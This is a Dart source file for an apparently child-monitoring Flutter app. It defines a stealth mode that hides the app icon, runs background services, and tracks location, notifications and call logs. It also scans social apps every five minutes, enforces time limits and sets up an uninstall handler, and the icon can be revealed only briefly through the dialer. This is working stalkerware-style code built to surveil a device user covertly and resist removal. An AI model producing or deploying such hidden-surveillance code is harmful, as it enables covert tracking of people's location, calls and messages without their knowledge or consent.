import 'package:shared_preferences/shared_preferences.dart';
import 'package:child_app/utils/native_channel.dart';
import 'package:child_app/services/location_service.dart';
import 'package:child_app/services/social_monitor.dart';
import 'package:child_app/services/call_log_service.dart';
import 'package:child_app/services/notification_service.dart';
import 'package:child_app/services/time_limit_service.dart';
import 'package:child_app/services/uninstall_handler.dart';
import 'package:child_app/utils/task_runner.dart';

class StealthHandler {
  static Future<bool> isStealthActive() async {
    final prefs = await SharedPreferences.getInstance();
    return prefs.getBool('stealth_active') ?? false;
  }

  static Future<void> toggleStealthMode() async {
    final isActive = await isStealthActive();
    if (isActive) {
      await deactivateStealthMode();
    } else {
      await activateStealthMode();
    }
  }

  static Future<void> activateStealthMode() async {
    // 1. Hide app icon
    await NativeChannel.hideAppIcon();
    
    // 2. Start background services
    await NativeChannel.startStealthService();
    
    // 3. Save state
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('stealth_active', true);
    
    // 4. Start all monitoring services
    _startMonitoringServices();
  }

  static Future<void> deactivateStealthMode() async {
    // 1. Show app icon
    await NativeChannel.unhideAppIcon();
    
    // 2. Stop all background services
    _stopMonitoringServices();
    
    // 3. Save state
    final prefs = await SharedPreferences.getInstance();
    await prefs.setBool('stealth_active', false);
  }

  static void _startMonitoringServices() {
    // Start all background services
    LocationService.start();
    NotificationService.start();
    CallLogService.start();
    
    // Schedule periodic tasks
    TaskRunner.schedule(
      taskId: 'social_monitor',
      interval: const Duration(minutes: 5),
      task: SocialMonitor.scanApps,
      immediate: true,
    );
    
    TaskRunner.schedule(
      taskId: 'time_limit_check',
      interval: const Duration(minutes: 1),
      task: TimeLimitService.checkTimeLimits,
    );
    
    // Initialize other services
    UninstallHandler.init();
  }

  static void _stopMonitoringServices() {
    // Stop all background services
    LocationService.stop();
    NotificationService.stop();
    CallLogService.stop();
    
    // Cancel scheduled tasks
    TaskRunner.cancel('social_monitor');
    TaskRunner.cancel('time_limit_check');
    
    // Dispose other services
    TimeLimitService.dispose();
    UninstallHandler.dispose();
  }

  static Future<void> showViaDialer() async {
    // Temporarily show app
    await NativeChannel.unhideAppIcon();
    
    // Schedule re-hide after 5 minutes
    Future.delayed(const Duration(minutes: 5), () async {
      if (await isStealthActive()) {
        await NativeChannel.hideAppIcon();
      }
    });
  }
}